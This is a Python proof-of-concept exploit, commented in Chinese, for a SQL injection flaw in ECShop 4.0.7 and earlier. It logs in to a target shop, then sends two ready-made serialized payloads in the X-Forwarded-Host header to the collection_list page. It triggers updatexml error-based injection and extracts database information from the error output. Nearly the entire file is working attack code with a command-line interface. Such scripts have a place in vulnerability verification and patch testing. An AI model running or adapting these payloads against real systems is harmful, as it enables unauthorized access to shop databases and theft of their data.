#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ECShop 4.x collection_list SQL 注入漏洞 POC
影响版本：ECShop 4.0.7 及以下
通过 X-Forwarded-Host 头注入恶意 payload，利用 insert_ 函数执行任意 SQL 查询。
"""

import requests
import sys
import argparse
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 固定哈希值（与 ECShop 2.x/3.x 漏洞相同）
HASH = "45ea207d7a2b68c49582d2d22adf953a"

# 两种注入方式
PAYLOAD_USER_ACCOUNT = (
    f'{HASH}user_account|a:2:{{s:7:"user_id";s:38:"0\'-(updatexml(1,repeat(user(),2),1))-\'";s:7:"payment";s:1:"4";}}|{HASH}'
)
PAYLOAD_PAY_LOG = (
    f'{HASH}pay_log|s:44:"1\' and updatexml(1,repeat(user(),2),1) and \'";|{HASH}'
)


def login(target_url, username, password, timeout=10, verify=True):
    """
    登录 ECShop 并获取 Session Cookie
    :param target_url: 目标基础 URL，如 http://127.0.0.1:8080
    :param username: 用户名
    :param password: 密码
    :param timeout: 请求超时
    :param verify: 是否验证 SSL 证书
    :return: requests.Session 对象（已登录），或 None
    """
    session = requests.Session()
    login_url = f"{target_url}/user.php?act=login"

    # 先获取页面以获取 CSRF token（如有需要）
    try:
        resp = session.get(login_url, timeout=timeout, verify=verify)
        # 尝试提取 token（ECShop 登录表单可能有隐藏字段）
        token_match = re.search(r'name="(?:token|csrf_token)"\s+value="([^"]+)"', resp.text)
        token = token_match.group(1) if token_match else ""
    except Exception as e:
        print(f"[-] 获取登录页面失败: {e}")
        return None

    # 构造登录数据
    data = {
        "username": username,
        "password": password,
        "act": "signin",
        "back_act": "",
    }
    if token:
        data["token"] = token

    try:
        resp = session.post(login_url, data=data, timeout=timeout, verify=verify, allow_redirects=False)
        # 检查是否登录成功（通常重定向到 user.php）
        if resp.status_code in (301, 302) or "user.php" in resp.headers.get("Location", ""):
            print(f"[+] 登录成功: {username}")
            return session
        else:
            print(f"[-] 登录失败，状态码: {resp.status_code}")
            print(f"    响应: {resp.text[:200]}")
            return None
    except Exception as e:
        print(f"[-] 登录请求异常: {e}")
        return None


def exploit(session, target_url, payload_type="user_account", timeout=10, verify=True):
    """
    发送恶意请求触发 SQL 注入
    :param session: 已登录的 requests.Session 对象
    :param target_url: 目标基础 URL
    :param payload_type: "user_account" 或 "pay_log"
    :param timeout: 请求超时
    :param verify: 是否验证 SSL 证书
    :return: 是否成功（响应中包含错误信息）
    """
    if payload_type == "user_account":
        payload = PAYLOAD_USER_ACCOUNT
    else:
        payload = PAYLOAD_PAY_LOG

    url = f"{target_url}/user.php?act=collection_list"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en",
        "X-Forwarded-Host": payload,
        "Connection": "close",
    }

    try:
        print(f"[*] 发送请求，payload 类型: {payload_type}")
        print(f"[*] X-Forwarded-Host: {payload[:80]}...")

        resp = session.get(url, headers=headers, timeout=timeout, verify=verify)

        # 检查响应中是否包含 SQL 错误信息（updatexml 报错注入的特征）
        if "XPATH syntax error" in resp.text or "updatexml" in resp.text:
            print("[+] 漏洞利用成功！检测到 SQL 报错信息。")
            # 提取报错信息中的敏感数据
            error_match = re.search(r"XPATH syntax error: '([^']+)'", resp.text)
            if error_match:
                print(f"[+] 提取到数据库信息: {error_match.group(1)}")
            # 打印响应片段
            print("\n[+] 响应片段:")
            print("=" * 50)
            # 提取报错附近的内容
            for line in resp.text.split("\n"):
                if "XPATH" in line or "updatexml" in line:
                    print(line.strip()[:200])
            print("=" * 50)
            return True
        else:
            print("[-] 未检测到 SQL 报错信息，可能漏洞已修复或 payload 不正确")
            # 调试：打印响应前500字符
            print(f"    响应前500字符: {resp.text[:500]}")
            return False

    except requests.exceptions.ConnectionError:
        print(f"[-] 无法连接到 {target_url}")
    except requests.exceptions.Timeout:
        print(f"[-] 请求超时")
    except Exception as e:
        print(f"[-] 请求异常: {e}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="ECShop 4.x collection_list SQL 注入漏洞 POC",
        epilog="示例: python3 poc.py http://127.0.0.1:8080 demo 123456"
    )
    parser.add_argument("url", help="目标基础 URL，如 http://127.0.0.1:8080")
    parser.add_argument("username", help="ECShop 登录用户名")
    parser.add_argument("password", help="ECShop 登录密码")
    parser.add_argument("--payload", "-p", default="user_account", choices=["user_account", "pay_log"],
                        help="注入方式: user_account 或 pay_log，默认 user_account")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    parser.add_argument("--insecure", action="store_true", help="忽略 SSL 证书验证")
    args = parser.parse_args()

    verify = not args.insecure

    # 1. 登录
    print(f"[*] 尝试登录: {args.username}")
    session = login(args.url, args.username, args.password, args.timeout, verify)
    if session is None:
        print("[!] 登录失败，请检查用户名密码或目标是否可访问")
        sys.exit(1)

    # 2. 执行漏洞利用
    success = exploit(session, args.url, args.payload, args.timeout, verify)

    if success:
        print("\n[+] 漏洞利用成功！")
        sys.exit(0)
    else:
        print("\n[!] 漏洞利用失败，可能原因：")
        print("  1. 目标版本高于 4.0.7，漏洞已修复")
        print("  2. 用户名/密码错误或未登录")
        print("  3. 目标地址不正确")
        sys.exit(1)


if __name__ == "__main__":
    main()